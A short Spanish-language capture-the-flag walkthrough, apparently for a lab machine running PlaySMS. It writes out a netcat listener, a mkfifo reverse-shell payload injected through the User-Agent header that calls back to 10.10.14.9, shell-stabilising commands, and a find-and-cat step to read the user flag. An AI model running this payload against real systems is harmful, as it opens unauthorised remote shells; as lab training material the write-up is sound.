## Vuln exploit & Gaining Access {-}

### Ganando acceso con PlaySMS {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos nuevamente el csv a la web y interceptamos la peticion con burpsuite
1. Cambiamos el User-agent 

    ```bash
    User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```


Aqui ya miramos si podemos leer la flag

```bash
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt 2>/dev/null | xargs cat
```

Ya podemos ver la flag.